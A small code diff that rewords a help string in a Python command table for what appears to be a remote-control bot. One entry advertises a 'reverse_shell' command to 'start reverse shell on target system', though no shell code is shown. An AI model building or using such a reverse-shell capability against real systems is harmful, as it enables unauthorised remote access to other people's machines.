@@ -37,7 +37,7 @@ scripts_name = {
 
     "/start": "`/start`: run `help` command!",
 
-    "reverse_shell": "start reverse shell on target system"
+    "reverse_shell": "`reverse_shell`: start reverse shell on target system"
 }
 
 
